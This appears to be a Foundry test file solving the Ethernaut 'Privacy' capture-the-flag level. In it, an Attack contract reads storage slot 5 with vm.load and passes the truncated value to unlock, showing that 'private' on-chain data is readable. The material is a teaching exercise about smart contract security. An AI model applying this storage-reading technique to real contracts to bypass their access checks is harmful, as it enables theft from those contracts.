// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/12_Privacy.sol";

contract PrivacyTest is Test {
    Privacy instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);

        bytes32[3] memory data;
        data[0] = keccak256(abi.encodePacked(msg.sender, "0"));
        data[1] = keccak256(abi.encodePacked(msg.sender, "1"));
        data[2] = keccak256(abi.encodePacked(msg.sender, "2"));
        instance = new Privacy(data);

        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        attacker.attack(11);
        assertEq(instance.locked(), false);
    }
}

contract Attack is Test {
    Privacy instance;

    constructor(address fb) {
        instance = Privacy(fb);
    }

    function attack(uint _floor) public {
        bytes32 data = vm.load(address(instance), bytes32(uint256(5)));
        instance.unlock(bytes16(data));
    }
}
